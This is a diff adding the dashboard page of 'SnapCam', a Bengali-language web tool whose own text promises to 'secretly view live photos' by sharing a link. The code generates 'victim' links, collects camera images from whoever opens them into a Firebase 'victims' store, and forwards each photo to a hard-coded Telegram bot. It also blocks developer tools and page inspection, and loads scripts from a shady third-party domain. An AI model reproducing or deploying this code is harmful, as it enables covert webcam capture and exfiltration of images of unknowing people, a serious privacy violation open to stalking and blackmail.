@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script>
+document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+    
+    if (!window.shown) {
+        window.shown = true;
+        Swal.fire({
+            icon: 'warning',
+            title: 'কোড চুরি নিষেধ!',
+            html: '<b>এই ওয়েবসাইটের সকল কোড ও ডিজাইন কপিরাইট দ্বারা সুরক্ষিত।</b><br>অনুমতি ছাড়া কপি করা আইনত অপরাধ।',
+            confirmButtonText: 'ঠিক আছে',
+            allowOutsideClick: false,
+            allowEscapeKey: false
+        });
+    }
+});
+</script>
+<script>
+(function() {
+    // রাইট ক্লিক
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    
+    // কীবোর্ড শর্টকাট
+    document.addEventListener('keydown', function(e) {
+        if (e.keyCode == 123 || // F12
+            (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || // Ctrl+Shift+I/J/C
+            (e.ctrlKey && e.keyCode == 85) || // Ctrl+U
+            (e.ctrlKey && e.keyCode == 83) || // Ctrl+S
+            (e.ctrlKey && e.keyCode == 65)) { // Ctrl+A
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+    });
+
+    // সিলেকশন বন্ধ
+    document.onselectstart = function(e) { return false; };
+    document.ondragstart = function(e) { return false; };
+})();
+</script>
+  
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SnapCam - Free Online Camera Capture & Webcam</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Poppins',sans-serif;background:#f8f9fa;color:#1e3a8a;line-height:1.5}
+header{background:#fff;padding:1px 0;text-align:center;box-shadow:0 2px 10px rgba(0,0,0,0.08);position:sticky;top:0;z-index:100}
+.logo{height:60px;border-radius:5%}
+.container{max-width:100%;padding:15px}
+.thumb{width:100%;max-width:400px;border-radius:16px;margin:20px auto;display:block;box-shadow:0 10px 30px rgba(0,0,0,0.12);border:1px solid #e0e7ff}
+h1{font-size:1.8em;margin:15px 0;color:#1e40af;font-weight:700;text-align:center}
+p{font-size:1.05em;color:#475569;text-align:center;margin:10px auto;max-width:90%}
+.btn{background:#3b82f6;color:#fff;padding:14px 40px;font-size:1.1em;border:none;border-radius:50px;cursor:pointer;margin:15px auto;display:block;width:90%;max-width:350px;font-weight:600;box-shadow:0 8px 20px rgba(59,130,246,0.3);transition:.3s}
+.btn:hover{transform:translateY(-3px)}
+#linkBox{display:none;margin:30px auto;padding:20px;background:#fff;border-radius:16px;box-shadow:0 8px 25px rgba(0,0,0,0.1);border:2px dashed #3b82f6;width:90%;max-width:400px}
+#victimLink{width:100%;padding:14px;font-size:1em;background:#eff6ff;border:2px solid #3b82f6;border-radius:12px;color:#1e40af;text-align:center;margin:12px 0;word-break:break-all;font-weight:600}
+.gallery{margin-top:40px;padding:10px}
+.gallery h2{font-size:1.5em;color:#1e40af;margin-bottom:20px;text-align:center}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:14px;padding:0 10px}
+.card{background:#fff;border-radius:16px;overflow:hidden;box-shadow:0 6px 20px rgba(0,0,0,0.1);transition:.3s;position:relative}
+.card:hover{transform:translateY(-6px)}
+.card img{width:100%;height:180px;object-fit:cover;border-bottom:4px solid #3b82f6;cursor:pointer}
+.time{background:#3b82f6;color:#fff;padding:8px;font-size:0.8em;text-align:center;font-weight:600}
+.download-btn{position:absolute;bottom:38px;right:8px;background:#10b981;color:#fff;width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:18px;box-shadow:0 2px 10px rgba(0,0,0,0.3)}
+.download-btn:hover{background:#059669}
+.delete-btn{position:absolute;top:8px;right:8px;background:#ef4444;color:#fff;width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:18px;box-shadow:0 2px 10px rgba(0,0,0,0.3)}
+.delete-btn:hover{background:#dc2626}
+.noimg{background:#fff;padding:50px;border-radius:16px;text-align:center;color:#64748b;font-size:1.1em;box-shadow:0 5px 15px rgba(0,0,0,0.08);margin:20px}
+footer{background:#fff;padding:30px;text-align:center;color:#64748b;font-size:0.9em;border-top:1px solid #e0e7ff;margin-top:60px}
+footer a{color:#3b82f6;text-decoration:none;font-weight:600}
+</style>
+</head>
+<body>
+
+<header><img src="https://raw.githubusercontent.com/shakib0122222/SnapCam/7184a97e6e70fec66d5fa9f1e04ab0f1cb99f8d1/20251201_180900.png" alt="Logo" class="logo"></header>
+
+<div class="container">
+  <img src="https://i.ibb.co/2HsnN1h/x.jpg" alt="Demo" class="thumb">
+  <h1>গোপনে লাইভ ছবি দেখুন</h1>
+  <p>লিংক শেয়ার করুন → কেউ খুললেই তার ক্যামেরা থেকে ছবি এখানে চলে আসবে!</p>
+
+  <button class="btn" onclick="generateLink()">নতুন লিংক তৈরি করুন</button>
+
+  <div id="linkBox">
+    <h2 style="color:#1e40af;font-size:1.3em;margin-bottom:15px">তোমার লিংক রেডি!</h2>
+    <input type="text" id="victimLink" readonly>
+    <button class="btn" onclick="copyLink()" style="background:#10b981">কপি করুন</button>
+  </div>
+
+  <div class="gallery">
+    <h2>লাইভ ছবি (১ ঘণ্টা পর্যন্ত)</h2>
+    <div class="noimg" id="noimg">এখনো কোনো ছবি আসেনি...</div>
+    <div class="grid" id="grid"></div>
+  </div>
+</div>
+
+<footer>© 2025 COPYRIGHT BY <a href="https://t.me/PixGuard_BD">PixGuard</a></footer>
+
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script>
+const BOT_TOKEN = "8214148154:AAH5jfutrpIUR5NxR1Ed522IysoLhQ6YhWY";
+const CHAT_ID = "7731349577";
+
+const firebaseConfig = {apiKey:"AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",authDomain:"cam-snap-8e956.firebaseapp.com",databaseURL:"https://cam-snap-8e956-default-rtdb.firebaseio.com",projectId:"cam-snap-8e956",appId:"1:982089892260:web:2cfa5a4d3b3dbcf45d0131"};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+let currentId = localStorage.getItem("currentCamId") || null;
+
+if(currentId){
+  document.getElementById("linkBox").style.display = "block";
+  document.getElementById("victimLink").value = location.href.split('index.html')[0] + "view.html?id=" + currentId;
+  loadPhotos(currentId);
+}
+
+function generateLink(){
+  currentId = Date.now().toString(36);
+  localStorage.setItem("currentCamId", currentId);
+  const link = location.href.split('index.html')[0] + "view.html?id=" + currentId;
+  document.getElementById("linkBox").style.display = "block";
+  document.getElementById("victimLink").value = link;
+  document.getElementById("grid").innerHTML = "";
+  document.getElementById("noimg").style.display = "block";
+  loadPhotos(currentId);
+}
+
+function copyLink(){
+  document.getElementById("victimLink").select();
+  document.execCommand("copy");
+  alert("কপি হয়ে গেছে!");
+}
+
+function deletePhoto(key){
+  db.ref("victims/"+currentId+"/"+key).remove();
+}
+
+async function sendToTelegram(base64){
+  try{
+    const blob = await (await fetch(base64)).blob();
+    const file = new File([blob], "photo.jpg", {type:"image/jpeg"});
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    form.append('photo', file);
+    form.append('caption', `নতুন ছবি!\nলিংক: ${location.href.split('index.html')[0] + "view.html?id=" + currentId}`);
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:form});
+  }catch(e){}
+}
+
+// ডাউনলোড ফাংশন
+function downloadImage(imgSrc) {
+  const a = document.createElement('a');
+  a.href = imgSrc;
+  a.download = 'SnapCam_' + new Date().getTime() + '.jpg';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+}
+
+function loadPhotos(id){
+  const ref = db.ref("victims/"+id);
+  ref.on("child_added", s=>{
+    const key = s.key;
+    const data = s.val();
+    if(!data?.data) return;
+    document.getElementById("noimg").style.display = "none";
+    const card = document.createElement("div"); 
+    card.className = "card";
+    card.innerHTML = `
+      <img src="${data.data}" onclick="window.open('${data.data}')">
+      <div class="time">${new Date(data.time).toLocaleTimeString('bn-BD')}</div>
+      <div class="download-btn" onclick="downloadImage('${data.data}')" title="ডাউনলোড">↓</div>
+      <div class="delete-btn" onclick="deletePhoto('${key}');this.parentElement.remove()">Trash</div>
+    `;
+    document.getElementById("grid").appendChild(card);
+    sendToTelegram(data.data);
+  });
+  setTimeout(()=>{ ref.remove(); localStorage.removeItem("currentCamId"); }, 3600000);
+}
+</script>
+
+
+<!-- টেলিগ্রাম ফ্লোটিং বাবল – আগের সুন্দর ডাইনামিক ডিজাইন -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<style>
+  .tg-bubble {
+    position: fixed;
+    bottom: 30px;
+    right: 30px;
+    width: 62px;
+    height: 62px;
+    background: linear-gradient(135deg, #0088cc, #00aaff);
+    color: white;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 32px;
+    box-shadow: 0 8px 25px rgba(0,136,204,0.4);
+    z-index: 9999;
+    cursor: pointer;
+    transition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+    animation: pulse2 4s infinite;
+  }
+
+  .tg-bubble:hover {
+    transform: translateY(-10px) scale(1.12);
+    box-shadow: 0 15px 35px rgba(0,136,204,0.6);
+  }
+
+  @keyframes pulse2 {
+    0%, 100% { box-shadow: 0 8px 25px rgba(0,136,204,0.4); }
+    50% { box-shadow: 0 8px 35px rgba(0,136,204,0.65); }
+  }
+
+  .tg-tooltip {
+    position: absolute;
+    bottom: 80px;
+    right: -20px;
+    background: #1e1e1e;
+    color: #fff;
+    padding: 12px 18px;
+    border-radius: 25px;
+    font-size: 15px;
+    white-space: nowrap;
+    opacity: 0;
+    visibility: hidden;
+    transform: translateY(10px);
+    transition: all 0.4s ease;
+    box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+  }
+
+  .tg-tooltip::after {
+    content: '';
+    position: absolute;
+    top: 100%;
+    right: 20px;
+    border: 10px solid transparent;
+    border-top-color: #1e1e1e;
+  }
+
+  .tg-bubble:hover .tg-tooltip {
+    opacity: 1;
+    visibility: visible;
+    transform: translateY(0);
+  }
+
+  @media (max-width: 768px) {
+    .tg-bubble { width: 56px; height: 56px; font-size: 28px; bottom: 20px; right: 20px; }
+  }
+</style>
+
+<!-- বাবলটা -->
+<div class="tg-bubble" onclick="openMyChannel()">
+  <i class="fa-brands fa-telegram"></i>
+  <div class="tg-tooltip">হাই! PixGuard চ্যানেলে চ্যাট করি</div>
+</div>
+
+<script>
+function openMyChannel() {
+  const channelLink = "https://t.me/PixGuard_BD";
+  window.open(channelLink, '_blank');
+}
+</script>
+  
+<script type='text/javascript' src='//spinachhypocrisy.com/1a/6b/af/1a6baf54ea8dc0c2a4e21f28343bf3c7.js'></script>
+<script type='text/javascript' src='//spinachhypocrisy.com/1a/6b/af/1a6baf54ea8dc0c2a4e21f28343bf3c7.js'></script>
+  
+</body>
+</html>
